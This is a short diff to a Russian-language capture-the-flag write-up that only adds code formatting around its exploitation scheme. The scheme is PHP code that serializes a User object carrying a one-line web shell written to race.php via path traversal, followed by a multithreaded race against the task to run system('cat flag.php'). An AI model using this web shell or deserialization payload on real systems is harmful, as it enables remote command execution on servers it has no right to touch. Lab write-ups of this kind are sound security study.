@@ -34,12 +34,13 @@ echo urlencode(serialize($user));
 
 Схема эксплуатации:
 
+```
 <?php
 
 include './index.php';
 $user = new User("../public/race.php", "sadasdas", "<?=$_GET[a]($_GET[b]);?>", "asdsada", "asdasdasd");
 echo urlencode(serialize($user));
-
-Далее используем либо Burp Suite с интрудером в побольше потоков, либо пишем скрипт на удобном языке, который в несколько потоков дропает этот пейлоад в таск и дергает race.php?a=system&b=cat%20flag.php
+```
+Далее используем либо Burp Suite с интрудером в побольше потоков, либо пишем скрипт на удобном языке, который в несколько потоков дропает этот пейлоад в таск и дергает `race.php?a=system&b=cat%20flag.php`
 
 Рано или поздно повезет, скрипт выиграет гонку и выведет флаг
